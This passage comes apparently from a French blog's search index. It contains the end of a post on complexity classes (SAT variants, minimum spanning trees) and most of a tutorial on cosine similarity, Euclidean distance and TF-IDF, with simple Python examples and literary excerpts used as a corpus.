telles que les $p$ clauses soient vérifiées ? C'est Cook qui, en 1972 fit une démonstration directe de la $NP$-Complétude de ce problème. Il existe un ensemble de sous-problèmes à SAT qui sont 1-SAT, 2-SAT, 3-SAT, etc. Ainsi pour 1-SAT nous avons le problème SAT avec des clauses à un littéral, pour 2-SAT des clauses à 2 littéraux, etc. On pourrait penser que tous ces problèmes sont $NP$-complets sans appartenir à $P$ puisque leur énoncé est quasiment le même. On se rend vite compte que ce n'est pas le cas : 1-SAT peut être résolu de manière triviale, en temps linéaire. Il suffit de parcourir l'ensemble des clauses et de retourner FAUX si l'on en rencontre une qui est fausse (cela correspond à regarder un simple booléen par clause). 2-SAT peut être résolu en temps polynomial. Je vous laisser chercher l'algorithme qui n'est guère compliqué. 3-SAT est $NP$-complet. On peut d'ailleurs montrer que SAT $\\propto$ 3-SAT pour montrer que 3-SAT est $NP$-complet. Exemple : Arbre couvrant de poids minimal Pour clore cet article sur une touche moins technique, on peut citer un second problème dont la modification d'un petit élément d'énoncé peut changer la classe du problème. Le problème de l'arbre couvrant de poids minimal est un problème que l'on peut formuler de la manière suivante : étant donné un graphe valué, trouver l'arbre contenant l'ensemble des sommets, pour lequel, la somme des valeurs des arcs est minimale. Il s'agit d'un problème avec de nombreuses applications concrètes. On peut citer par exemple l'optimisation de la longueur de câblage dans un avion ou tout autre appareil. Ce problème peut être résolu par l'algorithme de Prim ou de Kruskal en temps polynomial (on utilisera l'un ou l'autre selon la structure du graphe). Voici une variante de ce problème : étant donné un graphe valué, trouver un arbre couvrant de poids minimal dont le degré des sommets de l'arbre est borné par $k$ fixé (c'est à dire que pour chaque sommet, il ne peut arriver ou partir que $k$ arcs). Cette variante peut modéliser une situation réelle, dans le cas du câble d'un établissement où les différents switchs ne disposent que de $k$ ports. Cela peut paraître étonnant, mais ce problème n'est plus polynomial. Conclusion J'espère que cet article vous aura convaincu de l'intérêt de posséder des notions basiques sur le calcul de complexité algorithmique et surtout sur la connaissance des différentes classes de complexité qui conditionnent le choix des méthodes de résolution d'un problème (et également ses performances). Un algorithme d'apparence polynomial n'en est pas forcément un, et un problème apparent à un autre problème par son énoncé n'est pas forcément dans la même classe de complexité. Seule une étude formelle de la taille d'écriture permet de répondre au premier piège et quelques techniques permettent de s'assurer que l'on peut réduire un problème à un autre (réduction polynomiale ou notion de sous-problème)."},{"tags":"content","url":"https://yliesc.github.io/pages/pdp/content/similarite-cosinus-et-recherche-textuelle","title":"Similarité cosinus et recherche textuelle","text":"De nombreux domaines de recherche sont sollicités par le développement d'Internet, notamment l'évaluation des similarités : similarité entre une requête et des documents (moteur de recherche), entre des artistes (système de recommandation), entre des utilisateurs ou produits (site marchand), entre des images… Tout l'enjeu de ce pan de recherche est donc de départager de manière pertinente le nombre toujours croissant de données qui circulent sur Internet et d'en extraire des informations utiles pour répondre à divers problèmes. L'objectif de cet article est d'amorcer la réflexion en présentant les bases de la similarité cosinus, une méthode principalement utilisée pour l'analyse de texte. Les exemples en Python qui suivent sont volontairement peu optimisés et n'utilisent pas de bibliothèques spécifiques. Une approche du problème : recherche d'artistes similaires Le modèle vectoriel La distance euclidienne Implémentation en Python La similarité cosinus Implémentation en Python Distances ou angles ? Les questions à se poser Recherche de documents pertinents Une méthode de pondération : le TF-IDF Application 1. Calcul des fréquences inverses 2. Calcul des poids TF-IDF pour A 3. Calcul des poids TF-IDF pour B 4. Calcul des poids TF-IDF pour R Implémentation en Python Une approche du problème : recherche d'artistes similaires Imaginons un système comme Lastfm qui possède des tags pondérés pour décrire chaque artiste, par exemple « rock : 100, classical : 24… ». Nous héritons de toutes ces informations et notre but est de pouvoir déterminer l'artiste le plus similaire à un autre. L'application proposée ci-dessous est bien entendue limitée puisque pour augmenter nos chances d'obtenir des similarités satisfaisantes, il faudrait déjà se demander si des tags pondérés seuls peuvent décrire correctement un artiste. On admettra que c'est le cas. Pour information, Lastfm utilise également des algorithmes de recherche de plus proches voisins pour fournir ses recommandations, en se basant sur les statistiques de sa communauté pour établir des liens de similarité entre les utilisateurs, selon leur tendance d'écoute. Le modèle vectoriel Souvent, dans le domaine de la « similarité », on aime bien représenter graphiquement nos objets et les valeurs dont on dispose. Car en faisant varier ces dernières, on peut espérer trouver un lien entre ces variations chiffrées, leur signification concrète dans le cadre de notre application (la similarité entre les deux objets augmente ou diminue) et une grandeur mathématique visible et mesurable : une distance, un angle, le coefficient d'une droite moyenne, etc. L'avantage d'une telle représentation est que, si jamais on parvient à trouver ce lien, on sait qu'il existe des formules mathématiques facilement applicables pour effectuer toutes sortes de mesures dans un repère. Dans le domaine de la recherche d'information , on doit ce « modèle vectoriel » à Gerard Salton . En se basant sur ce modèle, on pourrait matérialiser un artiste par un vecteur dont la dimension serait égale au nombre de tags étudiés et dont chaque attribut correspondrait au poids du tag associé. Si on se limite à un espace à deux dimensions, voici comment on pourrait représenter deux artistes A et B ayant respectivement pour tags (rock : 40, electro : 50) et (rock : 100, electro : 25). Par abus de langage, on appellera aussi A et B les extrémités de ces deux vecteurs. Plus on augmente les différences de poids pour chaque tag et plus la similarité entre les deux artistes baisse. Faites le test : il apparaît que la distance entre A et B et l' angle formé par les deux vecteurs pourraient être de bons indicateurs de la similarité existant entre les deux objets. Pour répondre à notre problème, il suffirait donc de représenter chaque artiste dans un repère et de comparer leurs positions relatives. Sur la figure ci-dessous, le vecteur R décrirait un artiste plus similaire à A qu'à C, mais plus similaire à C qu'à B. Cela peut se voir à la fois par la distance entre les différents points et les angles formés par les vecteurs. Mais cela est-il toujours vrai ? Quelle méthode choisir ? Avant tout, nous allons implémenter chacune des deux mesures. Bien que cela soit difficilement représentable, on généralisera ce raisonnement à des espaces à plus de deux dimensions. La distance euclidienne Dans un espace à $n$ dimensions, la distance euclidienne $AB$ est définie comme la racine carrée de la somme des différences au carré entre les attributs de même rang des deux vecteurs $A$ et $B$. $$d(A, B) = \\sqrt{\\sum\\limits_{i=1}&#94;{n}{(A_i - B_i)&#94;2}}$$ Pour obtenir un indice de la similarité existant entre $A$ et $B$, puisque plus la distance est faible, plus la similarité est censée augmenter, on peut prendre l'inverse de la distance euclidienne. Pour éviter d'avoir un dénominateur nul, on ajoute 1 : $$\\mathrm{similarité(A, B)} = \\frac{1}{1 + \\sqrt{\\sum\\limits_{i=1}&#94;{n}{(A_i - B_i)&#94;2}}}$$ De ce fait, on a $0 < \\mathrm{similarité(A, B)} \\le 1$ et plus $\\mathrm{similarité(A, B)}$ s'approche de 1, plus la similarité entre les objets représentés par $A$ et $B$ est grande. Implémentation en Python On a adapté la formule mathématique à notre situation où les vecteurs n'ont pas forcément tous les mêmes tags de base. Pour y remédier, on se place dans un espace comprenant le nombre de dimensions nécessaire pour que chaque tag puisse être représenté (avec all_keys ) et si l'un des vecteurs ne possède pas d'attribut pour ce tag, alors on lui donne un poids nul par défaut (c'est le rôle des expressions a.get(k, 0) et b.get(k, 0) ). # coding: utf-8 from math import sqrt data = { 'Pink Floyd' : { 'progressive rock' : 100 , 'classic rock' : 78 , 'psychedelic rock' : 70 , 'experimental' : 5 }, 'Alain Souchon' : { 'chanson française' : 100 , 'chanson' : 34 , 'pop' : 33 , 'singer-songwriter' : 12 }, 'Hans Zimmer' : { 'soundtrack' : 100 , 'instrumental' : 57 , 'classical' : 41 , 'composer' : 32 }, 'The Police' : { 'rock' : 100 , 'new wave' : 66 , 'classic rock' : 81 , 'pop' : 40 }, 'Chopin' : { 'classical' : 100 , 'piano' : 47 , 'romantic' : 26 , 'instrumental' : 22 } } def similarity ( a , b ): all_keys = set ( list ( a ) + list ( b )) diffs = (( a . get ( k , 0 ) - b . get ( k , 0 )) ** 2 for k in all_keys ) distance = sqrt ( sum ( diffs )) return 1 / ( 1 + distance ) On peut maintenant calculer les scores de similarité entre tous nos artistes, effectuer un classement descendant et afficher les résultats : from operator import itemgetter for artist , tags in data . items (): scores = {} for artist_ , tags_ in data . items (): scores [ artist_ ] = similarity ( tags , tags_ ) scores = sorted ( scores . items (), key = itemgetter ( 1 ), reverse = True ) print ( ' \\n Similar artists for {}:' . format ( artist )) for artist , score in scores : print ( ' \\t {} ({:.2})' . format ( artist , score )) Similar artists for Pink Floyd: Pink Floyd (1.0) The Police (0.0057) Alain Souchon (0.0054) Chopin (0.0054) Hans Zimmer (0.0052) Similar artists for Alain Souchon: Alain Souchon (1.0) Chopin (0.0062) Hans Zimmer (0.0059) The Police (0.0055) Pink Floyd (0.0054) Similar artists for Hans Zimmer: Hans Zimmer (1.0) Chopin (0.0073) Alain Souchon (0.0059) Pink Floyd (0.0052) The Police (0.0051) Similar artists for Chopin: Chopin (1.0) Hans Zimmer (0.0073) Alain Souchon (0.0062) Pink Floyd (0.0054) The Police (0.0053) Similar artists for The Police: The Police (1.0) Pink Floyd (0.0057) Alain Souchon (0.0055) Chopin (0.0053) Hans Zimmer (0.0051) Il faut voir la valeur numérique retournée comme un indice, un score qui est destiné à être comparé pour effectuer un classement et non pas comme un pourcentage de ressemblance entre deux objets. La similarité cosinus Si on peut relier la similarité entre deux vecteurs $A$ et $B$ à la mesure de l'angle $\\theta$ qu'ils forment, alors on peut l'évaluer en calculant le cosinus de cet angle : c'est ainsi qu'est définie la similarité cosinus . Le calcul du cosinus se base sur l'expression du produit scalaire $A \\cdot B = |A| |B| \\cos(\\theta)$ et implique qu'aucun des deux vecteurs ne soit nul. $$\\mathrm{similarité(A, B)} = \\cos(\\theta) = \\frac{A \\cdot B}{ |A| |B|} = \\frac{ \\sum\\limits_{i=1}&#94;{n}{A_i \\times B_i} }{ \\sqrt{\\sum\\limits_{i=1}&#94;{n}{{A_i}&#94;2}} \\times \\sqrt{\\sum\\limits_{i=1}&#94;{n}{{B_i}&#94;2}} }$$ Si nos poids ne peuvent pas être négatifs, alors on a $0 \\le \\mathrm{similarité(A, B)} \\le 1$. Plus la mesure de l'angle est faible, plus son cosinus est élevé : avec cette formule, plus $\\mathrm{similarité(A, B)}$ s'approche de 1, plus la similarité entre les objets représentés par les vecteurs $A$ et $B$ est grande. Implémentation en Python Comme précédemment, on considère que l'absence d'un tag est équivalente à la présence de ce tag avec un poids nul. On peut alors se contenter de calculer le produit scalaire des vecteurs $A$ et $B$ uniquement avec leurs éléments communs (car si au rang $i$ au moins l'un des deux artistes possède un tag de poids 0, on aura $A_i \\times B_i = 0$, ce qui peut être ignoré dans la somme). L'interface de notre programme reste la même et il suffit alors de modifier la fonction qui calcule la similarité entre deux vecteurs. La restriction aux tags communs se fait avec l'expression … for k in a if k in b ). On suppose que les artistes ont au moins un tag de poids non nul (dénominateur non nul). from math import sqrt def similarity ( a , b ): scalar = sum ( a [ k ] * b [ k ] for k in a if k in b ) norm_a = sqrt ( sum ( v ** 2 for v in a . values ())) norm_b = sqrt ( sum ( v ** 2 for v in b . values ())) return scalar / ( norm_a * norm_b ) Similar artists for Pink Floyd: Pink Floyd (1.0) The Police (0.29) Alain Souchon (0.0) Hans Zimmer (0.0) Chopin (0.0) Similar artists for Alain Souchon: Alain Souchon (1.0) The Police (0.079) Pink Floyd (0.0) Hans Zimmer (0.0) Chopin (0.0) Similar artists for Hans Zimmer: Hans Zimmer (1.0) Chopin (0.37) Pink Floyd (0.0) Alain Souchon (0.0) The Police (0.0) Similar artists for Chopin: Chopin (1.0) Hans Zimmer (0.37) Pink Floyd (0.0) Alain Souchon (0.0) The Police (0.0) Similar artists for The Police: The Police (1.0) Pink Floyd (0.29) Alain Souchon (0.079) Hans Zimmer (0.0) Chopin (0.0) Distances ou angles ? Quelques observations, que l'on aurait pu prévoir mathématiquement : La distance euclidienne, contrairement à la similarité cosinus, donne des résultats peut-être moins en phase avec ce que l'on attend de notre application (Alain Souchon plus proche de Chopin et Hans Zimmer que de The Police, bien qu'il ait avec ce dernier le tag « pop » en commun) L'usage seul d'un angle ou d'une distance comme métrique mène à une perte d'information de nature différente. La similarité cosinus mesurant un angle, son point de vue est centré sur l'origine, et si on « étire » les vecteurs, on ne change pas la valeur du cosinus. Mais si on adopte un point de vue plus local et que l'on s'intéresse à la distance entre les deux points, la distance euclidienne varie. Il se passe la même chose lorsque l'on regarde les étoiles : doit-on dire qu'elles sont proches (ou ici « similaires ») si elles apparaissent en effet proches l'une de l'autre depuis la Terre, même si des années-lumière les séparent en réalité ? Avec la distance euclidienne, ce type de phénomène serait géométriquement limité à un cercle (puisque l'on s'intéresse aux distances) mais il y a un autre problème : pourquoi A serait-il plus similaire à C qu'à B sur la figure ci-dessous ? Les questions à se poser Pour pouvoir trancher sur la méthode à privilégier, il faut poursuivre ces raisonnements et se demander : Ce qui se passerait avec des dizaines et dizaines de dimensions Si ces cas problématiques peuvent être négligés lorsque l'on a beaucoup de données à comparer Quels sont les cas de divergence les plus extrêmes entre les deux méthodes ? À quoi sont-ils dûs ? Dans ces cas-là, y a-t-il toujours une méthode plus cohérente que l'autre ? Quelle méthode donne les résultats les plus cohérents avec ce que l'on attend de notre application : certaines méthodes sont parfois appropriées pour certains problèmes et d'autres non, et vice versa Quelle méthode donne les résultats les plus cohérents avec nos données : combien a-t-on de dimensions ? Les objets sont-ils tous décrits avec la même précision (ou les textes sont-ils de taille homogène) ? Les données sont-elles toutes de qualité ? L'écart type est-il faible ou élevé ? Peut-on se contenter d'une méthode grossière ou faut-il l'affiner ? Certaines méthodes ont-elles toujours tendance à favoriser les objets décrits avec beaucoup ou au contraire peu de précision ? Les métriques mathématiques ont-elles toujours un sens lorsque l'on néglige certains termes qui, dans notre application, seraient par exemple presque tous nuls ? Dans notre cas, si les produits scalaires sont tous en moyenne très proches de zéro, on peut développer le carré de la distance euclidienne et simplifier le double produit : a-t-on toujours une métrique cohérente ? etc. Pour notre programme, il s'avère que c'est la similarité cosinus qui donne les résultats les plus prévisibles. Encore une fois, il n'y a pas de méthode absolue : on la choisit en fonction de nos objectifs et de nos données. D'ailleurs, on n'a fait qu'appliquer des formules « génériques » à des données brutes (nos tags) sous seul prétexte qu'elles étaient déjà numériques… n'y aurait-il pas eu d'autres façons de construire notre modèle vectoriel ? Recherche de documents pertinents Lorsque l'on entend parler de calcul de similarité en informatique, c'est souvent dans le cadre de données textuelles : comment classer, regrouper des documents ? Comment reconnaître un spam ? Comment, pour une requête, retourner la liste des documents les plus pertinents (dans le cas d'un moteur de recherche par exemple) ? C'est à ce dernier problème que l'on va désormais s'intéresser. On utilisera un corpus contenant trois extraits et notre but est de déterminer quel document est le plus pertinent pour la requête R. un extrait A du Rouge et du Noir un extrait B des Misérables un extrait C de Candide une requête R « Le crime de Julien était un crime, un crime affreux » Dans le domaine de la recherche d'information , le modèle vectoriel et la similarité cosinus sont très utilisés. Les métriques comme la distance euclidienne le sont aussi, mais il faut alors normaliser les vecteurs de manière à ce que tous les documents soient comparables quelle que soit leur taille, ce qui est parfois fait de manière implicite lorsque l'on calcule des fréquences, par exemple. La similarité cosinus, entre autres, est pour cette raison parfois plus intuitive : elle vérifie que deux documents « pointent » dans la même direction sans souci de leur norme, puisqu'elle est insensible à la multiplication par un scalaire. Encore faut-il représenter nos documents dans un repère et en dégager des valeurs numériques. Le choix est assez limité. Les dimensions de notre espace vectoriel correspondront à l'ensemble du vocabulaire contenu dans nos différents documents. Ce qui va différer selon les documents, ce sont les fréquences auxquelles apparaissent ces mots. Dans un premier temps, on pourrait suggérer que le nombre d'occurrences de chaque mot dans le document constitue son « poids ». Puisque l'on ne peut pas représenter facilement un espace à plus de deux dimensions, on va s'intéresser uniquement aux mots « crime » et « julien » : Document A : 1 occurrence pour « crime », 1 occurrence pour « julien » Document B : 3 occurrences pour « crime », 0 occurrence pour « julien » Document C : 0 occurrence pour « crime », 0 occurrence pour « julien » Requête R : 3 occurrences pour « crime », 1 occurrence pour « julien » Avec la similarité cosinus, le document B serait donc le plus pertinent pour R. Mais dans le cas d'un contenu linguistique, cet indice de similarité est-il réellement pertinent, tout comme le fait de relier proportionnellement le poids d'un terme à son nombre d'occurrences ? Est-ce que l'on peut considérer qu'un document comportant 10 occurrences d'un terme est 10 fois plus pertinent qu'un document n'en comportant qu'une ? Et que faire des mots très courants comme les articles définis ou certains verbes qui risquent, avec leur poids élevé, d'« écraser » les autres mots pourtant plus intéressants lors d'une recherche ? Une méthode de pondération : le TF-IDF Pour palier la plupart de ces défauts, on utilise souvent une méthode nommée TF-IDF . Partant du constat qu'il était peu judicieux de considérer uniquement la fréquence d'un mot lors du calcul de son poids, le TF-IDF définit le poids d'un terme comme le produit de deux informations : La fréquence $\\mathrm{tf}(t,d)$ du terme $t$ dans le document $d$ : $$\\mathrm{tf}(t,d) = \\frac{n_{t, d}}{N_d}$$ où $n_{t, d}$ est le nombre d'occurrences de $t$ dans $d$ et $N_d$ la taille du document $d$ (le nombre de mots). Afin que les poids associés aux termes puissent être comparables quelle que soit la longueur des documents (qui est loin d'être toujours un bon critère de pertinence) et que le système ne souffre pas de failles permettant à un site d'augmenter son placement en répétant 1000 fois les mêmes mots-clés (dans le cas d'un moteur de recherche), il est nécessaire de relativiser ce nombre d'occurrences, en introduisant en quelque sorte ce que les anglais appelleraient un facteur de normalisation . Ici, on se contente simplement de la définition d'une fréquence en statistique : le nombre d'occurrences sur le nombre d'éléments. La fréquence inverse $\\mathrm{idf}(t, D)$ du terme $t$ dans tout le corpus $D$ : $$\\mathrm{idf}(t, D) = \\log \\frac{|D|}{|\\{d \\in D: t \\in d\\}|}$$ Il s'agit de diviser le nombre total de documents présents dans le corpus $D$ par le nombre de documents contenant le terme $t$, et d'en calculer le logarithme. L'idée est simple : cette fréquence inverse que l'on étend à l'ensemble du corpus permet de mesurer le caractère rare ou commun des termes, qui seront alors soit plus discriminants — on cherchera à donner à un mot qui n'apparaît pas souvent un poids élevé de manière à ce que le document qui le contient soit favorisé si on effectue une recherche avec ce mot — ou soit plus anecdotiques (comme c'est le cas des articles définis qui apparaissent dans la majorité si ce n'est la totalité des documents). Avec ce modèle, le poids $\\mathrm{tfidf}(t, d, D)$ d'un terme $t$, qui n'est plus seulement dépendant du document $d$ étudié mais également de l'ensemble du corpus $D$, s'obtient de cette manière : $$\\mathrm{tfidf}(t, d, D) = \\mathrm{tf}(t, d) \\times \\mathrm{idf}(t, D) = \\frac{n_{t, d}}{N_d} \\times \\log \\frac{|D|}{|\\{d \\in D: t \\in d\\}|}$$ Application Reprenons nos trois documents A, B et C et notre requête R. Voici les données dont nous avons besoin : Document A : 1 occurrence pour « julien », 1 occurrence pour « crime », 138 mots Document B : 0 occurrence pour « julien », 3 occurrences pour « crime », 105 mots Document C : 0 occurrence pour « julien », 0 occurrence pour « crime », 102 mots Requête R : 1 occurrence pour « julien », 3 occurrences pour « crime », 10 mots On va se limiter aux termes « julien » et « crime » et puisque le document C ne nous intéresse pas (à première vue, il n'a aucune similarité avec notre requête) on ne le représentera pas. Cependant, on le prendra en compte comme élément du corpus à part entière dans les calculs ci-dessous. 1. Calcul des fréquences inverses « julien » apparaît dans 1 document sur 3 : $\\mathrm{idf}(\\mathrm{julien}) = \\log \\frac{3}{1} = 1.10$ « crime » apparaît dans 2 documents sur 3 : $\\mathrm{idf}(\\mathrm{crime}) = \\log \\frac{3}{2} = 0.405$ 2. Calcul des poids TF-IDF pour A $\\mathrm{tfidf}(\\mathrm{julien})_A = \\frac{1}{138} \\times \\mathrm{idf}(\\mathrm{julien}) = \\frac{1}{138} \\times 1.10 = 0.0080$ $\\mathrm{tfidf}(\\mathrm{crime})_A = \\frac{1}{138} \\times \\mathrm{idf}(\\mathrm{crime}) = \\frac{1}{138} \\times 0.405 = 0.0029$ On représentera le document A par le vecteur $\\vec{OA}(0.0080, 0.0029)$. 3. Calcul des poids TF-IDF pour B $\\mathrm{tfidf}(\\mathrm{julien})_B = \\frac{0}{105} \\times \\mathrm{idf}(\\mathrm{julien}) = 0$ $\\mathrm{tfidf}(\\mathrm{crime})_B = \\frac{3}{105} \\times \\mathrm{idf}(\\mathrm{crime}) = \\frac{3}{105} \\times 0.405 = 0.012$ On représentera le document B par le vecteur $\\vec{OB}(0, 0.012)$. 4. Calcul des poids TF-IDF pour R $\\mathrm{tfidf}(\\mathrm{julien})_R = \\frac{1}{10} \\times \\mathrm{idf}(\\mathrm{julien}) = \\frac{1}{10} \\times 1.10 = 0.11$ $\\mathrm{tfidf}(\\mathrm{crime})_R = \\frac{3}{10} \\times \\mathrm{idf}(\\mathrm{crime}) = \\frac{3}{10} \\times 0.405 = 0.12$ La requête R peut donc être représentée par le vecteur $\\vec{OR}(0.11, 0.12)$. Ci-dessous, je me suis permis de multiplier par 10 les proportions des vecteurs $\\vec{OA}$ et $\\vec{OB}$ pour qu'ils soient plus visibles, mais puisque l'on ne s'intéresse qu'aux angles dans notre raisonnement, cela n'a pas beaucoup d'importance : Alors que notre première méthode donnait, pour la requête R, un indice de pertinence de 94 % pour le document B et de 89 % pour le document A, notre deuxième méthode avec pondération TF-IDF nous donne un indice de pertinence de 73 % pour le document B et de 88 % pour le document A. Autrement dit, les résultats sont inversés et cette méthode semble plus pertinente. Cela s'explique par la fréquence inverse de « julien » dans le corpus, qui apparaît seulement dans 1 document sur 3 alors que « crime » apparaît 2 fois sur 3. La proportionnalité qui existait dans notre première méthode est donc brisée et le terme « julien » est avantagé plus que ne l'est le terme « crime » car il est plus rare . Remarque : Jusqu'ici, on s'est limité à deux termes, « crime » et « Julien », afin de représenter plus facilement le problème. En théorie, il faudrait prendre en compte tous les mots de la requête et c'est ce que nous allons implémenter ci-dessous. Implémentation en Python Pour des raisons pratiques, les documents du corpus et les requêtes sont déjà superficiellement traités : retrait de la ponctuation et des accents, et découpage en liste de mots. corpus = { 'Le Rouge et le Noir' : [ 'je' , 'ne' , 'vous' , 'demande' , 'aucune' , 'grace' , 'continua' , 'julien' , 'en' , 'affermissant' , 'sa' , 'voix' , 'je' , 'ne' , 'me' , 'fais' , 'point' , 'illusion' , 'la' , 'mort' , 'attend' , 'elle' , 'sera' , 'juste' , 'ai' , 'pu' , 'attenter' , 'aux' , 'jours' , 'de' , 'la' , 'femme' , 'la' , 'plus' , 'digne' , 'de' , 'tous' , 'les' , 'respects' , 'de' , 'tous' , 'les' , 'hommages' , 'mme' , 'de' , 'renal' , 'avait' , 'ete' , 'pour' , 'moi' , 'comme' , 'une' , 'mere' , 'mon' , 'crime' , 'est' , 'atroce' , 'et' , 'il' , 'fut' , 'premedite' , 'ai' , 'donc' , 'merite' , 'la' , 'mort' , 'messieurs' , 'les' , 'jures' , 'quand' , 'je' , 'serais' , 'moins' , 'coupable' , 'je' , 'vois' , 'des' , 'hommes' , 'qui' , 'sans' , 'arreter' , 'ce' , 'que' , 'ma' , 'jeunesse' , 'peut' , 'meriter' , 'de' , 'pitie' , 'voudront' , 'punir' , 'en' , 'moi' , 'et' , 'decourager' , 'jamais' , 'cette' , 'classe' , 'de' , 'jeunes' , 'gens' , 'qui' , 'nes' , 'dans' , 'un' , 'ordre' , 'inferieur' , 'et' , 'en' , 'quelque' , 'sorte' , 'opprimes' , 'par' , 'la' , 'pauvrete' , 'ont' , 'le' , 'bonheur' , 'de' , 'se' , 'procurer' , 'une' , 'bonne' , 'education' , 'et' , 'audace' , 'de' , 'se' , 'meler' , 'ce' , 'que' , 'orgueil' , 'des' , 'gens' , 'riches' , 'appelle' , 'la' , 'societe' ], 'Les Misérables' : [ 'si' , 'la' , 'surcharge' , 'de' , 'la' , 'peine' , 'etait' , 'point' , 'effacement' , 'du' , 'delit' , 'et' , 'arrivait' , 'pas' , 'ce' , 'resultat' , 'de' , 'retourner' , 'la' , 'situation' , 'de' , 'remplacer' , 'la' , 'faute' , 'du' , 'delinquant' , 'par' , 'la' , 'faute' , 'de' , 'la' , 'repression' , 'de' , 'faire' , 'du' , 'coupable' , 'la' , 'victime' , 'et' , 'du' , 'debiteur' , 'le' , 'creancier' , 'et' , 'de' , 'mettre' , 'definitivement' , 'le' , 'droit' , 'du' , 'cote' , 'de' , 'celui' , 'la' , 'meme' , 'qui' , 'avait' , 'viole' , 'si' , 'cette' , 'peine' , 'compliquee' , 'des' , 'aggravations' , 'successives' , 'pour' , 'les' , 'tentatives' , 'evasion' , 'ne' , 'finissait' , 'pas' , 'par' , 'etre' , 'une' , 'sorte' , 'attentat' , 'du' , 'plus' , 'fort' , 'sur' , 'le' , 'plus' , 'faible' , 'un' , 'crime' , 'de' , 'la' , 'societe' , 'sur' , 'individu' , 'un' , 'crime' , 'qui' , 'recommencait' , 'tous' , 'les' , 'jours' , 'un' , 'crime' , 'qui' , 'durait' , 'dix' , 'neuf' , 'ans' ], 'Candide' : [ 'ils' , 'voguerent' , 'quelques' , 'lieues' , 'entre' , 'des' , 'bords' , 'tantot' , 'fleuris' , 'tantot' , 'arides' , 'tantot' , 'unis' , 'tantot' , 'escarpes' , 'la' , 'riviere' , 'elargissait' , 'toujours' , 'enfin' , 'elle' , 'se' , 'perdait' , 'sous' , 'une' , 'voute' , 'de' , 'rochers' , 'epouvantables' , 'qui' , 'elevaient' , 'jusqu' , 'au' , 'ciel' , 'les' , 'deux' , 'voyageurs' , 'eurent' , 'la' , 'hardiesse' , 'de' , 'abandonner' , 'aux' , 'flots' , 'sous' , 'cette' , 'voute' , 'le' , 'fleuve' , 'resserre' , 'en' , 'cet' , 'endroit' , 'les' , 'porta' , 'avec' , 'une' , 'rapidite' , 'et' , 'un' , 'bruit' , 'horrible' , 'au' , 'bout' , 'de' , 'vingt' , 'quatre' , 'heures' , 'ils' , 'revirent' , 'le' , 'jour' , 'mais' , 'leur' , 'canot' , 'se' , 'fracassa' , 'contre' , 'les' , 'ecueils' , 'il' , 'fallut' , 'se' , 'trainer' , 'de' , 'rocher' , 'en' , 'rocher' , 'pendant' , 'une' , 'lieue' , 'entiere' , 'enfin' , 'ils' , 'decouvrirent' , 'un' , 'horizon' , 'immense' , 'borde' , 'de' , 'montagnes' , 'inaccessibles' ] } queries = { 'Recherche A' : [ 'crime' ], 'Recherche B' : [ 'le' , 'crime' , 'affreux' , 'de' , 'julien' ], 'Recherche C' : [ 'coupable' , 'et' , 'societe' ], 'Recherche D' : [ 'montagne' , 'ciel' ] } On définit la fonction vectorize(doc, corpus) qui nous permettra d'obtenir un vecteur pour le document doc en attribuant à chaque terme son poids TF-IDF : from math import sqrt , log def tf ( term , doc ): return doc . count ( term ) / len ( doc ) def idf ( term , corpus ): try : return log ( len ( corpus ) / sum ( 1 for doc in corpus if term in doc )) # le dénominateur équivaut à len([doc for doc in corpus if term in doc]) except ZeroDivisionError : return 0 def vectorize ( doc , corpus ): vector = {} for term in doc : if term not in vector : vector [ term ] = tf ( term , doc ) * idf ( term , corpus ) return vector « Vectorisons » tout de suite les documents de notre corpus et les requêtes : corpus_v = {} for identifier , text in corpus . items (): corpus_v [ identifier ] = vectorize ( text , corpus . values ()) queries_v = {} for identifier , text in queries . items (): queries_v [ identifier ] = vectorize ( text , corpus . values ()) On peut valider le modèle TF-IDF en regardant si les termes les plus communs ont bien un poids plus faible que les autres termes plus rares. Pour cela, on affiche par exemple les 10 termes qui ont les poids les plus faibles pour Les Misérables : from operator import itemgetter weights = corpus_v [ 'Les Misérables' ] . items () for term , weight in sorted ( weights , key = itemgetter ( 1 ))[: 10 ]: print ( term + ' ' + str ( weight )) les 0.0 et 0.0 la 0.0 un 0.0 de 0.0 le 0.0 qui 0.0 une 0.0 des 0.0 cette 0.0 Le résultat parle de lui-même : puisque tous les textes possèdent au moins une occurrence de ces mots, on a dans tous les cas $\\mathrm{idf} = \\log 1 = 0$ et donc $\\mathrm{tfidf} = \\mathrm{tf} \\times 0 = 0$. Maintenant, on peut calculer la similarité cosinus entre les requêtes et les documents, en reprenant la fonction similarity(a, b) définie précédemment et en l'appliquant aux documents vectorisés : def similarity ( a , b ): scalar = sum ( a [ k ] * b [ k ] for k in a if k in b ) norm_a = sqrt ( sum ( v ** 2 for v in a . values ())) norm_b = sqrt ( sum ( v ** 2 for v in b . values ())) try : return scalar / ( norm_a * norm_b ) except ZeroDivisionError : return 0 for id_q , vector_q in queries_v . items (): for id_c , vector_c in corpus_v . items (): print ( 'Relevance between {} and {}:' . format ( id_q , id_c )) print ( '{:.2%}' . format ( similarity ( vector_q , vector_c ))) print ( ' \\n ' ) On traite le cas où la requête contient un terme absent des documents en lui attribuant un poids de 0 et le cas où la requête ne contiendrait que des mots absents des documents (ou de poids nuls) en retournant une similarité de 0, d'où la gestion des exceptions ZeroDivisionError dans le programme. Voici les résultats retournés. Pour rappel : Recherche A : « crime » Recherche B : « le crime affreux de Julien » Recherche C : « coupable et société » Rercheche D : « montagne ciel » Relevance between Recherche A and Le Rouge et le Noir: 3.50% Relevance between Recherche A and Les Misérables: 11.20% Relevance between Recherche A and Candide: 0.00% Relevance between Recherche B and Le Rouge et le Noir: 10.11% Relevance between Recherche B and Les Misérables: 3.88% Relevance between Recherche B and Candide: 0.00% Relevance between Recherche C and Le Rouge et le Noir: 4.95% Relevance between Recherche C and Les Misérables: 5.28% Relevance between Recherche C and Candide: 0.00% Relevance between Recherche D and Le Rouge et le Noir: 0.00% Relevance between Recherche D and Les Misérables: 0.00% Relevance between Recherche D and Candide: 9.84% Cet exemple est bien sûr très basique : en évaluant la similarité entre les documents, on ne prend pas en compte la place des mots dans le texte, la morphologie des phrases ni la présence éventuelle de synonymes ni même de pluriels. Il existe plusieurs méthodes de pondération, à commencer par des variantes pour le calcul du poids TF-IDF. Par exemple, au lieu de suivre la définition de la fréquence statistique, $\\mathrm{tf}(t,d)$ pourrait suivre une échelle logarithmique ou être défini comme le rapport du nombre d'occurrences du terme dans le document sur le nombre maximum d'occurrences d'un même mot dans le document, pour prendre en compte la richesse du vocabulaire utilisé. Autre point intéressant à noter, on utilise souvent une méthode différente pour calculer les poids des termes de la requête et les poids des termes des documents du corpus : en quelque sorte, on construit notre vecteur requête 